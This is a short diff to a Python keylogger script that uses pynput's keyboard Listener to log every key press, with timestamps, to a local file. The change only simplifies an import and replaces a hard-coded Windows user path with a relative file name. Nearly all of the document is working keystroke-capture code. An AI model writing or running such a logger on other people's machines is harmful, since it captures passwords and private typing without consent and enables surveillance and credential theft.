@@ -1,8 +1,7 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 import logging
 
-log_dir = ''
-logging.basicConfig(filename=(log_dir +"C:/Users/chimita/keyLog/keyboard.txt"),
+logging.basicConfig(filename=("keyboard.txt"),
                     level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 
 def on_press(key):
@@ -10,3 +9,4 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener :
     listener.join()
+
